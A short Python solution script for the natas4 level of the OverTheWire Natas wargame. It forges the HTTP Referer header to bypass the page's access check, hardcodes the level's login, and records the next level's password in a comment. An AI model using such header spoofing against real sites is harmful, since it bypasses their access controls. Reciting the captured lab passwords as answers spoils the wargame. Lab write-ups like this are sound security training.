#!/usr/bin/env python

import requests

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = "http://%s.natas.labs.overthewire.org/index.php" % username

response = requests.get(url, auth=(username, password), headers=headers)
content = response.text

print(content)

# we have a 'viewsource' ancour tag, so let's get it's content
# we need to change the referer header before making the request to { http://natas5.natas.labs.overthewire.org/ }
# and we got the right access to see the password now which is { natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq }
